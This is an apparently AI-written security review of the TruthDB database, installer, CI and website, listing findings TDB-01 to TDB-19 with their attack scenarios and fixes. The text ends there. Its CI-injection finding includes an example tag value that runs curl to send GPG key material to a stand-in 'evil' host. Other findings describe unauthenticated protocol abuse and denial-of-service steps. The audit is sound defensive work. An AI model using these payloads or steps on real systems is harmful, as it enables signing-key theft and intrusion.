# TruthDB — Organisation-Wide Security Review

- **Reviewer:** Claude Opus 4.8 (multi-agent audit, adversarially verified)
- **Date:** 2026-07-10
- **Scope:** All repositories in the TruthDB workspace (see [Scope](#1-scope)).
- **Type:** Read-only security review. **No source files were modified.**
- **Method:** 15 focused audit agents → every candidate finding re-checked by two independent verifiers (code-reading + exploitability) before inclusion. 42 findings survived verification (1 rejected); the highest-severity findings were additionally confirmed by hand against the source.

> ⚠️ **Headline:** The database ships as an **unauthenticated, unencrypted network service that binds to `0.0.0.0` and is auto-started by the Debian package on install**, and the bare-metal installer **seeds a hardcoded password (`123456`) for `root` and a sudo-capable user on every machine it provisions**. Either issue alone is a full compromise. Treat both as release blockers. See [TDB-01](#tdb-01--critical--database-protocol-has-no-authentication) and [TDB-02](#tdb-02--critical--hardcoded-default-password-123456-for-root-and-a-sudo-user).

---

## Contents

1. [Scope](#1-scope)
2. [Executive summary](#2-executive-summary)
3. [Severity summary](#3-severity-summary)
4. [Threat model](#4-threat-model)
5. [Findings](#5-findings)
   - [Critical](#critical)
   - [High](#high)
   - [Medium](#medium)
   - [Low](#low)
   - [Informational](#informational)
6. [Prioritised remediation roadmap](#6-prioritised-remediation-roadmap)
7. [Cross-cutting themes](#7-cross-cutting-themes)
8. [Methodology, confidence & limitations](#8-methodology-confidence--limitations)

---

## 1. Scope

| Repo | What it is | Reviewed |
|------|------------|----------|
| `truthdb/` | Database server, protocol, storage engine, CLI, bench | ✅ full |
| `installer/` | Bare-metal installer (runs as root in initramfs) | ✅ full |
| `installer-iso/` | Bootable ISO build scripts | ✅ scripts/supply-chain |
| `installer-kernel/` | Custom kernel config + build | ✅ CI/build |
| `installer-kernel-builder-image/` | Docker image to build the kernel | ✅ CI/Dockerfile |
| `orchestrator/` | Release/admin CLI (holds GitHub tokens) | ✅ full |
| `website/` | Public Vue SPA on Firebase Hosting + Auth | ✅ full |
| `apt/` | Debian apt repository (reprepro, GPG) | ✅ full |
| `.github/` (all repos) | GitHub Actions CI/CD | ✅ all 17 workflows |

Not in scope: runtime penetration testing, dependency CVE scanning with live feeds (`cargo audit` / `npm audit` were not run — see [§8](#8-methodology-confidence--limitations)), and the aspirational WASM sandbox (not yet implemented).

---

## 2. Executive summary

TruthDB is an early-stage, WAL-centric database delivered as a bare-metal appliance. The code is clean and the storage engine is disciplined about `unsafe` (the direct-I/O paths hold up well). The security problems are **not** memory-corruption bugs — they are **missing foundational controls**: the system was built as if the network and the host were trusted, and that assumption is baked into the defaults, the packaging, and the installer.

Four facts combine into the central risk:

1. **No authentication.** The wire protocol has no credential of any kind. `Dispatcher::dispatch` runs `engine.execute()` on any `CommandReq` frame; the `HelloReq` handshake decodes the request and throws it away (`let _req: HelloReq`). ([TDB-01](#tdb-01--critical--database-protocol-has-no-authentication))
2. **No transport encryption.** Frames are read/written over a raw `TcpStream`; there is no TLS anywhere in the workspace. ([TDB-03](#tdb-03--high--no-transport-encryption-plaintext-tcp))
3. **Unsafe defaults.** The server defaults to binding `0.0.0.0:9623`, and the Debian `postinst` **enables and starts** the service on install. ([TDB-04](#tdb-04--high--default-bind-0000--auto-start-on-install-exposes-the-db-to-the-network))
4. **A hardcoded backdoor in the installer.** `configure_initial_users()` sets `root` and a sudo-capable `truthdb` account to `123456`, permanently and identically on every install. ([TDB-02](#tdb-02--critical--hardcoded-default-password-123456-for-root-and-a-sudo-user))

The net effect: `apt-get install truthdb-server` yields, with **zero operator action**, a database open for read/write to anyone who can route a packet to port 9623; and every appliance installed from the ISO ships with the same publicly-known root password.

Secondary themes: unbounded/pre-allocating request handling gives cheap remote **DoS** ([TDB-05](#tdb-05--high--unauthenticated-connection-exhaustion--memory-dos), [TDB-08](#tdb-08--medium--unbounded-per-request-work-under-a-global-engine-mutex)); the release/supply-chain path relies on **same-origin checksums and mutable action/image tags** rather than independent signatures ([TDB-11](#tdb-11--low--third-party-github-actions-pinned-to-mutable-tags)–[TDB-14](#tdb-14--low--toolchain-bootstrapped-via-curl--sh)); a **CI shell-injection** in the apt publisher sits next to the GPG signing key ([TDB-06](#tdb-06--high--ci-shell-injection-in-the-apt-publisher-next-to-the-gpg-signing-key)); and the website is missing standard **security headers** ([TDB-21](#tdb-21--low--missing-web-security-headers)). Data is stored **world-readable and unencrypted at rest** ([TDB-07](#tdb-07--medium--data--wal-file-world-readable-0o644-no-encryption-at-rest)).

**Good news:** none of these require a redesign. Authentication + TLS on the handshake, a loopback default, a first-boot password reset, and standard CI/supply-chain hardening close the great majority of the risk. A prioritised plan is in [§6](#6-prioritised-remediation-roadmap).

---

## 3. Severity summary

| Severity | Count | IDs |
|----------|-------|-----|
| 🔴 Critical | 2 | TDB-01, TDB-02 |
| 🟠 High | 4 | TDB-03, TDB-04, TDB-05, TDB-06 |
| 🟡 Medium | 4 | TDB-07, TDB-08, TDB-09, TDB-25 |
| 🔵 Low | 13 | TDB-10 … TDB-21, TDB-26 |
| ⚪ Info | 3 | TDB-22, TDB-23, TDB-24 |
| **Total** | **26** | (24 consolidated from 42 verified agent findings + 2 from `cargo audit` / `npm audit`) |

> Entries TDB-01…TDB-24 consolidate 42 verified agent findings; where the same issue was independently reported by multiple agents this is noted as **Corroboration** and raises confidence. TDB-25 was added from a `cargo audit` run (its ID is out of severity order because it was appended after the agent audit).

---

## 4. Threat model

The review assumed these attacker positions:

1. **Remote unauthenticated network client** able to send arbitrary bytes to `:9623`.
2. **Anonymous web visitor** to the public website.
3. **On-path / MITM attacker** between a client and the DB, or on an artifact/package download.
4. **Malicious or low-trust actor** who can push a git tag or trigger CI (collaborator / leaked token).
5. **Local unprivileged user** on a host running the DB or a build.

---

## 5. Findings

Each finding: **location · CWE · description · attack scenario · remediation.** Paths are relative to the workspace root.

### Critical

---

#### TDB-01 · CRITICAL · Database protocol has no authentication

- **Location:** `truthdb/crates/truthdb-core/src/dispatcher.rs:40–83`, `truthdb/crates/truthdb-core/src/client_listener.rs:68–89`
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **Corroboration:** independently reported by 5 of the 15 audit agents (net-protocol, core-engine, core-listener, server-config-auth, sweep). Hand-verified.

**Description.** A connection is handed straight from `accept()` into the dispatch loop with no authentication step. `Dispatcher::dispatch` handles `MsgType::CommandReq` by decoding the client's bincode payload and calling `engine.execute(&req.command)` directly. The only handshake, `HelloReq`, carries no credential (its fields are `protocol_version` / `client_name` / `client_version`) and its handler decodes the request into `_req` and discards it — and a client may send `CommandReq` **without ever sending `HelloReq`**. `engine.execute` exposes `CreateIndex`, `InsertDocument` (both persisted to the WAL) and `Search` (reads all documents). There is no `Dispatcher` session/auth state, no config field for a credential, and a repo-wide grep for auth/token/password/credential in the connection path returns nothing.

**Attack scenario.** A remote client with a route to the host opens a TCP connection to `:9623`, writes an 8-byte header with `msg_type=5` (`CommandReq`) and a bincode `CommandReq{ id, command }` body, and the server runs it. The attacker uses `Search` to exfiltrate every stored document, `InsertDocument` to forge/poison data, and `CreateIndex` to mutate schema — all durably written. Complete confidentiality **and** integrity compromise with no credentials.

**Remediation.** Introduce a mandatory authentication step before any `CommandReq` is dispatched: carry a credential (shared secret / bearer token / mTLS client identity) in the handshake, verify it, and track an `authenticated` flag per connection that gates `engine.execute`. Reject/close connections that send `CommandReq` before authenticating. Source the credential from config and keep it out of logs. (mTLS would satisfy both this and [TDB-03](#tdb-03--high--no-transport-encryption-plaintext-tcp) at once.)

---

#### TDB-02 · CRITICAL · Hardcoded default password `123456` for root and a sudo user

- **Location:** `installer/src/platform/install.rs:83–128` (`configure_initial_users`)
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **Corroboration:** hand-verified against source.

**Description.** `configure_initial_users()` hardcodes `username = "truthdb"` / `password = "123456"`, creates that user with `useradd -m -s /bin/bash -G sudo truthdb` (added to the **sudo** group), then runs `chpasswd` to set the password of **both `truthdb` and `root`** to `123456`. The accounts are not locked and there is no `chage`/`passwd --expire`/first-boot reset anywhere in the installer. The password is therefore permanent, identical across every installed appliance, and publicly known (it is in this source tree).

**Attack scenario.** *Local escalation is certain:* any unprivileged user on an installed box runs `su -` (or `sudo -i` as `truthdb`) and enters `123456` to become root. *Remote is likely:* this is a server appliance; wherever a password login service is reachable (SSH/console), a network or console attacker logs in as `root:123456` or `truthdb:123456`. The credential is the same on every unit, so one guess compromises the entire fleet.

**Remediation.** Do **not** ship a hardcoded password for root or any sudoer. Preferred: prompt the operator for a password during install (pipe into `chpasswd`), or leave root locked (`passwd -l root`) and provision an operator-supplied SSH public key. At minimum, force `chage -d 0 truthdb root` so the known password **must** be changed on first login and cannot be reused.

---

### High

---

#### TDB-03 · HIGH · No transport encryption (plaintext TCP)

- **Location:** `truthdb/crates/truthdb-net/src/framing.rs:9–74`, `truthdb/crates/truthdb-core/src/client_listener.rs:42`
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
- **Corroboration:** reported by 4 agents. There is no `rustls`/`native-tls`/`openssl` dependency anywhere in the workspace.

**Description.** `read_frame`/`write_frame` operate directly on a raw `tokio::net::TcpStream`; the listener accepts plain TCP and the CLI connects with a bare `TcpStream::connect`. All frames — command strings and `CommandResp` bodies containing query results and full document contents — cross the network as unencrypted, unauthenticated bincode. There is no integrity protection either.

**Attack scenario.** An on-path attacker (shared LAN segment, ARP spoof, compromised hop) passively reads every query and every returned document in transit, and actively rewrites in-flight `CommandReq`/`CommandResp` frames or injects new `CommandReq` frames onto an established connection. Neither endpoint can detect the tampering.

**Remediation.** Wrap the accepted stream in TLS (e.g. `tokio-rustls` with a server certificate) and run framing over the encrypted stream; require TLS for any non-loopback bind. Mutual TLS also provides the authentication in [TDB-01](#tdb-01--critical--database-protocol-has-no-authentication).

---

#### TDB-04 · HIGH · Default bind `0.0.0.0` + auto-start on install exposes the DB to the network

- **Location:** `truthdb/src/config.rs:63–65`, `truthdb/config/default.toml:3`, `truthdb/packaging/debian/postinst:20–32`, `truthdb/packaging/truthdb.toml.example:11–13`
- **CWE:** CWE-1327 (Binding to an Unrestricted IP Address)
- **Corroboration:** reported by 2 agents (server-config-auth, pkg-apt). Hand-verified.

**Description.** `default_addr()` returns `"0.0.0.0"` and the embedded `default.toml` sets `addr = "0.0.0.0"`. The Debian `postinst` runs `deb-systemd-helper enable` + `deb-systemd-invoke start truthdb.service` on a fresh install. So the moment `apt-get install truthdb-server` finishes, the daemon listens on **all interfaces** with no operator opt-in. (The CLI safely defaults to `127.0.0.1`; only the *server* default is unsafe.) This is what turns [TDB-01](#tdb-01--critical--database-protocol-has-no-authentication) from a localhost-only risk into remote compromise.

**Attack scenario.** An operator installs the package on a host with any routable/LAN interface. Without touching config, TruthDB is reachable network-wide and — having no auth — is read/write to any host that can reach the port.

**Remediation.** Default `addr` to `127.0.0.1` in both `config.rs` and `config/default.toml`. Require an explicit opt-in for a non-loopback bind, and ideally **refuse** to bind a non-loopback address unless authentication and TLS are configured. Consider shipping the service disabled (not auto-started) until the admin sets a bind address and credentials.

---

#### TDB-05 · HIGH · Unauthenticated connection-exhaustion / memory DoS

- **Location:** `truthdb/crates/truthdb-core/src/client_listener.rs:49–89`, `truthdb/crates/truthdb-net/src/framing.rs:28–34`
- **CWE:** CWE-770 (Allocation of Resources Without Limits), CWE-400 (Uncontrolled Resource Consumption)
- **Corroboration:** reported by 6 agents — the most-corroborated cluster after "no auth". Consolidates three compounding gaps:
  1. **No connection cap / backpressure.** The accept loop `tokio::spawn`s a task per connection with no semaphore or max-connections counter.
  2. **No read/idle timeout.** The per-connection read loop only races the shutdown channel; `read_exact` can block forever, so a slowloris client that sends a partial header and stalls pins a socket + task indefinitely.
  3. **Eager pre-allocation.** `read_frame` does `let mut payload = vec![0u8; len];` for the attacker-declared length (up to the 8 MiB `MAX_PAYLOAD`) **before** any payload byte arrives — ~10⁶× amplification from 8 bytes of input.

**Attack scenario.** An attacker opens thousands of connections, on each sending only an 8-byte header declaring a ~8 MiB payload and then nothing. Each connection immediately pins ~8 MiB and never times out; ~1,000 connections ≈ 8 GB RAM. Scaling up OOM-kills the single-process database. Cost to the attacker: 8 bytes and an idle socket per 8 MiB held.

**Remediation.** (a) Bound accepts with a `Semaphore` (and/or per-IP cap), releasing on handler exit. (b) Wrap `read_frame` in `tokio::time::timeout` (a shorter deadline for the initial header) and drop idle connections. (c) Do not pre-allocate the declared length — read incrementally into a buffer that grows toward the (capped) length. Consider lowering `MAX_PAYLOAD` if 8 MiB frames aren't required.

---

#### TDB-06 · HIGH · CI shell injection in the apt publisher, next to the GPG signing key

- **Location:** `apt/.github/workflows/publish.yml:29` (and re-interpolated at `:106`, `:34`)
- **CWE:** CWE-94 (Code Injection)
- **Corroboration:** reported by 2 agents (rated HIGH and MEDIUM respectively). Hand-verified.
- **Precondition caveat:** exploitation requires the ability to send the `repository_dispatch` (`new-debs`) or trigger `workflow_dispatch` — i.e. a token with `contents:write` on the apt repo (the release-automation dispatch token) or a collaborator. It is therefore a **blast-radius / defense-in-depth** failure rather than an anonymous-remote hole — but the payoff (theft of the apt signing key) is severe, hence HIGH.

**Description.** Line 29 interpolates `${{ github.event.client_payload.tag || github.event.inputs.tag }}` **directly into a `run:` body** (`TAG="…"`), expanded by the Actions templating engine into the script text before bash runs. Git tag names legitimately allow shell metacharacters, and inside the double-quoted assignment a `$(…)`/backtick value executes as a command substitution. The **same publish job** imports the apt repository's GPG private key (`echo "$APT_GPG_PRIVATE_KEY" | gpg --batch --import`) and passphrase. The value is also written raw to `$GITHUB_OUTPUT` (line 34) and re-used in a commit message (line 106).

**Attack scenario.** An actor who can dispatch/trigger the workflow supplies `tag = v1$(curl -sd @$HOME/.gnupg/… https://evil)`. The injected command runs in the job holding `APT_GPG_PRIVATE_KEY`, exfiltrating the signing key. With that key the attacker signs malicious `.deb`s that every TruthDB apt user installs **as root** — full supply-chain compromise.

**Remediation.** Never interpolate event/inputs into `run:` bodies. Pass the value through an `env:` var (`env: TAG_INPUT: ${{ … }}`) and reference `"$TAG_INPUT"`; validate against a strict allowlist (`^v[0-9]+\.[0-9]+\.[0-9]+$`) before any use, including `$GITHUB_OUTPUT` and commit messages. Move the GPG-key steps into a separate job that never consumes untrusted input.

---

### Medium

---

#### TDB-07 · MEDIUM · Data + WAL file world-readable (0o644), no encryption at rest

- **Location:** `truthdb/crates/truthdb-core/src/direct_io.rs:88–94`; plaintext writes at `storage.rs:409–413` (WAL) and `storage.rs:692–694` (snapshot)
- **CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

**Description.** `DirectFile::create_new` opens the single backing file (header, superblocks, WAL ring, data region, snapshots) with `.mode(0o644)` — readable by group and other. This is the **only** permission-setting call in the codebase, and nothing tightens it afterward. It compounds with a complete absence of at-rest encryption (WAL payloads and snapshots are written as raw `serde_json`/bincode; no `aes`/`chacha`/`ring` dependency exists). Notably, `FileHeader.created_salt: [u8;16]` is reserved and persisted but never used — at-rest encryption appears scaffolded but unimplemented.

**Attack scenario.** A local unprivileged user runs `cat /var/lib/truthdb/truth.db` and recovers every document, index, and WAL record in cleartext. The same plaintext exposure applies to backups, copied images, and stolen/decommissioned drives.

**Remediation.** Create the file `0o600` (owner-only) and verify the parent directory isn't world/group-traversable. Separately decide whether at-rest encryption is required; if so, wire `created_salt` into a KDF and encrypt WAL/snapshot payloads, or explicitly document reliance on full-disk encryption + `0o600` as the accepted control.

---

#### TDB-08 · MEDIUM · Unbounded per-request work under a global engine mutex

- **Location:** `truthdb/crates/truthdb-core/src/dispatcher.rs:57–58`, `truthdb/crates/truthdb-core/src/engine.rs:296–406, 799–804`
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)

**Description.** Every connection shares one `Arc<Mutex<Engine>>`, and each `CommandReq` holds `engine.lock()` for the full duration of `engine.execute`. There is no per-request timeout and no cost bound beyond the 8 MiB frame cap. Within a single frame an attacker can force heavy work: a `match` query tokenises an arbitrarily large string; a `bool` query with a big `must`/`filter` iterates and re-filters score maps per clause; a `bool` with empty `must` + matching `filter` materialises **every** document id and then clones each matching document's full `_source` into the response. All of this serialises behind the single lock, stalling every other client (including heartbeats).

**Attack scenario.** An attacker (already able to reach the unauthenticated port) repeatedly sends near-8 MiB search commands whose filter matches the whole index. Each holds the global lock while building large intermediate maps and cloning document sources, keeping the server unresponsive with only a few connections.

**Remediation.** Cap request cost independently of frame size: limit document/field counts and value lengths on insert; cap the number/depth of `bool` clauses and `match` length on search; cap hits materialised/returned. Add a per-request execution timeout. Consider an `RwLock` or per-index locking so a single expensive read can't serialise the whole server.

---

#### TDB-09 · MEDIUM · Firebase deploy action pinned to a mutable `@v0` tag while holding the service-account secret

- **Location:** `website/.github/workflows/release.yml:156–160`, `website/.github/workflows/firebase-preview.yml:41–44`
- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)

**Description.** The live-deploy step uses `FirebaseExtended/action-hosting-deploy@v0` and passes it `secrets.FIREBASE_SERVICE_ACCOUNT` and `secrets.GITHUB_TOKEN`. `@v0` is a mutable tag the action maintainer (or anyone who compromises that repo/tag) can repoint to arbitrary code. GitHub's own guidance is to pin third-party actions to a full commit SHA.

**Attack scenario.** An attacker who moves the `v0` tag (or compromises the upstream repo) gains code execution in the deploy job on the next release, with the Firebase service account and `GITHUB_TOKEN` in the environment — letting them exfiltrate the service account and deploy attacker-controlled HTML/JS to the live public site (drive-by malware, credential phishing against Firebase Auth users).

**Remediation.** Pin `FirebaseExtended/action-hosting-deploy` to a full 40-char commit SHA in both workflows and bump deliberately (Dependabot can track it).

---

#### TDB-25 · MEDIUM · Vulnerable and unmaintained dependencies (`cargo audit`)

- **Location:** `truthdb/Cargo.lock`, `orchestrator/Cargo.lock`, `installer/Cargo.lock`
- **CWE:** CWE-1395 / CWE-937 (Use of components with known vulnerabilities)
- **Tooling:** `cargo audit` vs. RustSec advisory-db (1,159 advisories), 2026-07-10. Reachability confirmed with `cargo tree -i` — it changes the picture substantially, so it is stated per crate.

**Description.**

*Reachable — compiled into a shipped binary:*
- **`bytes 1.11.0` → RUSTSEC-2026-0007** (integer overflow in `BytesMut::reserve`). Pulled by `tokio` into the **network-facing `truthdb-net` crate** (confirmed via `cargo tree`), and into orchestrator. This is the one on the attacker-facing DB. Fix: `>= 1.11.1`.
- **`rustls-webpki 0.103.8` → four advisories** (RUSTSEC-2026-0098/0099 name-constraint bypass, 2026-0049 CRL matching, **2026-0104 reachable panic in CRL parsing**). Compiled into `orchestrator` via `reqwest → rustls`. Orchestrator is an HTTPS *client* to `api.github.com`, so exploitability is low (needs a malicious cert chain / CRL), but it is live code. Fix: `>= 0.103.13`.
- **`anyhow 1.0.100` → RUSTSEC-2026-0190** (unsoundness in `Error::downcast_mut()`) — all three repos. Low impact. Fix: update.
- **`lru 0.12.5`** (Stacked-Borrows unsoundness, RUSTSEC-2026-0002) and **`rand 0.9.2`** (RUSTSEC-2026-0097) — orchestrator only, low impact.

*Present in the lockfile but **NOT compiled** (currently not exploitable):*
- **`quinn-proto 0.11.13` → RUSTSEC-2026-0185 (7.5) and RUSTSEC-2026-0037 (8.7)**, both remote QUIC DoS. **Despite the high CVSS, `cargo tree -i quinn-proto` reports "nothing to print"** — it is an optional `reqwest` http3 dependency recorded in `Cargo.lock` but never built (the feature is off). No real exposure unless http3 is ever enabled. Bump opportunistically (`>= 0.11.15`); do not treat the 8.7 score as live risk.

*Unmaintained (not vulnerabilities, but relevant):*
- **`bincode 1.3.3` → RUSTSEC-2025-0141** (unmaintained). **This is the database's on-the-wire serialization format, sitting directly on the attacker-controlled decode path** ([TDB-01](#tdb-01--critical--database-protocol-has-no-authentication)). Worth planning a migration to the maintained `bincode 2.x` (breaking API).
- **`paste 1.0.15`** (RUSTSEC-2024-0436, unmaintained) — orchestrator, transitive.

`installer` is clean apart from the `anyhow` advisory (23 deps, 0 hard vulnerabilities).

**Attack scenario.** None of these has a confirmed reachable exploit today: the network-relevant `bytes` overflow requires hitting the specific `BytesMut::reserve` path, the `rustls-webpki` issues require a malicious server cert/CRL against an outbound client, and the high-CVSS `quinn-proto` code isn't compiled. The finding is **hygiene on a network-facing service with unpatched advisories, where every fix is one command** — left unpatched, a future feature change (e.g. enabling http3, or exercising the `bytes` path) could make one of these live.

**Remediation.** Run `cargo update` in each repo to pick up the semver-compatible fixes (`bytes`, `rustls-webpki`, `anyhow`, `lru`, `rand`, `quinn-proto`), then re-run `cargo audit`. **Add `cargo audit` (or `cargo-deny`) as a CI gate** so new advisories fail the build. Separately, track the `bincode` migration given it is on the untrusted decode path.

---

### Low

> The Low findings are real but either require a privileged precondition, have limited impact, or are defense-in-depth. They should be scheduled, not ignored — several are the supply-chain hardening that backstops the Critical/High issues.

---

#### TDB-10 · LOW · Release-workflow tag flows into `run:` scripts (command injection on tag push)

- **Location:** `truthdb/.github/workflows/release.yml:37` and the identical pattern in every repo's `release.yml` (orchestrator, installer, installer-iso, installer-kernel, installer-kernel-builder-image, website) plus `truthdb/.github/workflows/deb.yml:73,165`
- **CWE:** CWE-94. **Precondition:** requires git push/write access, so it widens the blast radius of a low-trust collaborator or compromised CI token rather than crossing a privilege boundary.

**Description.** Release workflows assign the tag via `TAG="${{ steps.get_tag.outputs.tag }}"` interpolated into a double-quoted bash assignment; a tag containing `$(…)`/backticks executes when the template expands. These jobs hold `contents:write` (and, in `deb.yml`, the apt dispatch token).

**Remediation.** Reference the tag through an `env:` var and use `"$TAG"`; validate against a strict version regex before use.

---

#### TDB-11 · LOW · Third-party GitHub Actions pinned to mutable tags

- **Location:** `installer-kernel-builder-image/.github/workflows/release.yml:84–101` (`docker/login-action@v3`, `docker/build-push-action@v6`, `docker/setup-qemu-action@v3`, `docker/setup-buildx-action@v3`), `…/ci.yml:26` (`hadolint/hadolint-action@v3.1.0`)
- **CWE:** CWE-1357

**Description.** These actions are pinned to mutable tags, not commit SHAs. The builder image (`ghcr.io/truthdb/truthdb-installer-kernel-builder-image`) is the exact container used to compile the installer kernel, so a compromise of any of these tags flows into the bootable installer artifact (which runs as root in initramfs). The release job runs them with a `packages:write` token.

**Remediation.** Pin all `docker/*` and `hadolint` actions to full commit SHAs; have `installer-kernel` consume the builder image by digest, not `:latest`.

---

#### TDB-12 · LOW · Docker base images pinned to floating tags, not digests

- **Location:** `installer-iso/run_container.sh:85` & `installer-iso/build_in_container.sh` (`ubuntu:24.04`), `truthdb/Dockerfile.bench:1,13` & `truthdb/Dockerfile.repl:1,13` (`rust:1-bookworm`, `debian:bookworm-slim`), `installer-kernel-builder-image/docker/Dockerfile:1`
- **CWE:** CWE-1104 (Use of Unmaintained/Unpinned Third-Party Components)

**Description.** Every image reference uses a mutable tag (`rust:1-bookworm` is especially loose — any 1.x). The build environment that produces the shipped installer and DB binaries is therefore not reproducible and can silently change.

**Remediation.** Pin base images by digest (`ubuntu:24.04@sha256:…`, `rust:1.92-bookworm@sha256:…`, `debian:bookworm-slim@sha256:…`) and update deliberately.

---

#### TDB-13 · LOW · Release artifacts authenticated by same-origin checksum, no independent signature

- **Location:** `installer-iso/build_and_run.sh:88–100,174–185`, `installer-iso/build_rootfs_payload.sh:78–103`, `apt/.github/workflows/publish.yml:80–95`
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature) / CWE-494

**Description.** The ISO build verifies the boot kernel, installer, and truthdb binaries **only** against a `.sha256` fetched from the **same** GitHub release. A co-located checksum detects transport corruption but provides **no authenticity**: anyone who can alter the release assets alters both. These artifacts are the root of trust for a bare-metal install (kernel booted directly; installer runs as root). Likewise the apt publisher GPG-signs whatever `*.deb` is attached to a release with no provenance check before signing.

**Attack scenario.** An attacker who compromises a GitHub release (leaked token, malicious release run, account takeover) replaces the artifact and its checksum; verification passes and a backdoored binary is signed into the trusted apt repo and embedded in the ISO.

**Remediation.** Sign release artifacts with a key held **outside** the CI token trust boundary (GPG detached sig or cosign/sigstore), ship the public key in the build scripts/repo, and verify the signature (not a same-origin sha256) before use and before `reprepro includedeb`.

---

#### TDB-14 · LOW · Toolchain bootstrapped via `curl … | sh`

- **Location:** `installer-iso/build_and_run.sh:141`
- **CWE:** CWE-494 (Download of Code Without Integrity Check)

**Description.** `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y` executes the rustup installer with no checksum/signature check; the resulting toolchain compiles the shipped installer/DB binaries. TLS-min-1.2 mitigates basic MITM, so residual risk is a compromise of the rustup endpoint/CDN.

**Remediation.** Download `rustup-init` to a file, verify a pinned SHA-256, then execute; or install a pinned toolchain from a package with a known digest.

---

#### TDB-15 · LOW · On-disk descriptor trusted via non-cryptographic checksum; unbounded startup allocation

- **Location:** `truthdb/crates/truthdb-core/src/storage.rs:811` (`load_snapshot`), `storage.rs:237–265` (`open_existing`), `storage_layout.rs:532` (`is_valid`)
- **CWE:** CWE-789 (Memory Allocation with Excessive Size Value)

**Description.** `load_snapshot` does `vec![0u8; desc.data_len as usize]` where `data_len` is a `u64` read from the on-disk descriptor, gated only by `is_valid()` (magic + `data_len>0` + an **xxh64** self-checksum). xxh64 is unkeyed — it detects corruption but is trivially forgeable by anyone who can write the file, and there is no bounds check that `data_len` fits the file. `open_existing` similarly trusts header offsets/sizes as file offsets and ring modulus without validating they're in-bounds/aligned/non-overlapping. Not remotely reachable (fields are server-written at runtime); the risk is an attacker-influenced file (restored backup, copied image, or the `0o644` file in [TDB-07](#tdb-07--medium--data--wal-file-world-readable-0o644-no-encryption-at-rest)).

**Attack scenario.** A forged descriptor with `data_len = 2^63` (checksum recomputed) passes `is_valid()`; the allocation aborts the process on next open (DoS). Forged offsets redirect reads/writes to arbitrary in-file positions.

**Remediation.** After reading the header, validate every region offset/size is aligned, within `[0, file_len]`, and non-overlapping before use; reject `data_len` exceeding the data region before allocating. If the on-disk format must resist tampering, use a keyed MAC rather than xxh64.

---

#### TDB-16 · LOW · Installer disk-in-use detection misses swap / LVM / RAID / overlay

- **Location:** `installer/src/platform/disks.rs:148–176` (`is_device_mounted`)
- **CWE:** CWE-665 (Improper Initialization) — incomplete safety interlock

**Description.** `is_device_mounted()` — the main automated interlock preventing selection of an in-use disk for destructive `wipefs` + GPT repartition — detects use **only** by string-matching `/proc/self/mountinfo` sources against `/dev/<name>`. It misses: active swap (never in mountinfo), assembled LVM PVs / mdraid members (whole-disk node isn't a mount source), live-installer overlayfs roots (source is `overlay`), and mounts whose source is a device-mapper path, a `/dev/disk/by-*` symlink, or `maj:min`. Any such disk passes the filter; if it's the single eligible disk it is auto-selected and wiped after only an ENTER showing the `/dev` path. (A separate unanchored `starts_with` match — `/dev/sda` matches `/dev/sdaa1` — errs safe.)

**Attack scenario.** A single-disk reinstall where the to-be-preserved disk is an unmounted LVM PV / RAID member / swap device: it passes `eligible_disks()`, is auto-selected, and its partition table + signatures are destroyed even though it held live data.

**Remediation.** Also treat a disk as in-use if any partition/holder is active swap (`/proc/swaps`), an assembled LVM PV, or an md/DRBD member (`/sys/block/<dev>/holders`), or if the running root/live media resolves onto it. Compare by `major:minor` (from `/sys/block/<dev>/dev`), resolve symlinks, and anchor the partition match.

---

#### TDB-17 · LOW · Global engine mutex poisoning causes permanent DoS until restart

- **Location:** `truthdb/crates/truthdb-core/src/dispatcher.rs:57–74`
- **CWE:** CWE-667 (Improper Locking). *Verifier verdict: PLAUSIBLE* — a reachable panic under the lock was not exhaustively proven, but any panic anywhere under it produces this outcome.

**Description.** The engine is guarded by one `std` `Mutex`. If any handler panics while holding the lock, the mutex is poisoned and every subsequent `lock()` returns `Err`; the dispatcher then answers all commands with `"engine lock poisoned"` — the database is dead until the process restarts. A single `unwrap`/`expect`/indexing panic in `engine.execute` on attacker input thus converts a transient fault into a permanent global outage.

**Remediation.** Recover from poisoning (`lock().unwrap_or_else(|e| e.into_inner())`) so one panic can't wedge the service, and audit `engine.execute` for panics on untrusted input (belt-and-braces with [TDB-08](#tdb-08--medium--unbounded-per-request-work-under-a-global-engine-mutex)).

---

#### TDB-18 · LOW · Orchestrator silently falls back to unauthenticated GitHub requests on 401/403

- **Location:** `orchestrator/src/github.rs:102–123` (`send_get`)
- **CWE:** CWE-636 (Not Failing Securely / fail-open)

**Description.** `send_get()` — used by every GitHub call including the release path — on a 401/403 from an authenticated request transparently **re-issues the request with no `Authorization` header** and returns that anonymous response. A comment says only read-only dashboards should degrade this way, but the fallback lives in the shared helper and so also governs release automation. Consequences: an invalid/expired/under-scoped token is hidden instead of surfaced; on public repos the release/monitor logic proceeds on anonymous data (subject to the 60 req/hr limit any outsider can also consume); on private repos the anonymous retry yields 404, which `wait_for_release_assets` treats as "not found yet" and spins until the ~45-min timeout.

**Remediation.** Don't fail open in the shared helper: remove the automatic unauthenticated retry (or gate it behind an explicit opt-in used only by read-only monitor code). When a token is configured and the server returns 401/403, return that error so credential problems fail closed with a clear message — especially before any tag creation/push.

---

#### TDB-19 · LOW · `workspace-update` follows symlinks on write (arbitrary-file overwrite)

- **Location:** `orchestrator/src/workspace_update.rs:302–353` (`write_if_changed`, `install_launcher`)
- **CWE:** CWE-59 (Link Following)

**Description.** `write_if_changed()` does `fs::create_dir_all(parent)` then `fs::write(dest, …)` with no `O_NOFOLLOW`/symlink check and without unlinking a pre-existing symlink; `install_launcher()` does the same and additionally `chmod 0o755`s the path. Because `fs::write` follows symlinks, if a destination (or intermediate dir) is a symlink at write time, the write — and the `chmod` — land on the target.

**Attack scenario.** On a multi-user host where the workspace dir is group/world-writable (or a shared/predictable build path), a local attacker pre-plants a symlink at a path `workspace-update` writes (e.g. `<ws>/CLAUDE.md` or `<ws>/.bin/.orchestrator-bin`). Running `orchestrator workspace-update` overwrites the symlink target with orchestrator bytes and forces it to mode `0755`. Limited by requiring prior workspace write access and timing.

